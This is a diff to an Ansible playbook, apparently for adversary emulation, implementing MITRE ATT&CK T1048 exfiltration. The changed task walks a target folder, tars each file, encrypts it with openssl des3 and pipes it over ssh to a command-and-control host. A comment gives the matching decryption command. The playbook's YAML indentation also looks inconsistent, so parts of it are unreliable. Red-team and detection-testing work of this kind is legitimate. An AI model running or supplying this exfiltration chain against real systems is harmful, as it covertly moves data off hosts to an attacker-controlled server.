@@ -1,18 +1,20 @@
-# Playbook-T1048-chunk
-- name : Exfiltration Over Alternative Protocol - file split
+
+# Playbook-T1048-Chunk
+- name : Exfiltration Over Alternative Protocol in chunk over time
   hosts: linux
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: look for all files within folder
-      find:
+    - name: Ansible check directory exists example.
+      stat:
         path: "{{ exfiltration_folder }}"
-        patterns: "*"
-       register: file_chunk 
+      register: exfil_check
     - name: Exfiltration Over Alternative Protocol - SSH
-      file:
-        path: "{{ item.path }}"
       shell: |
-        tar czpf - {{ exfiltration_folder }}/* | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.tar.gz.enc'
-        # decrypt file on cnc: openssl des3 -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
-      when: exfil_check.stat.exists
+        cd {{ exfiltration_folder }}
+        for i in $( ls ); do
+            tar czpf - $i | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-$i.tar.gz.enc'
+        done
+       when: exfil_check.stat.exists
+        
+# decrypt file on cnc: openssl des3 -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
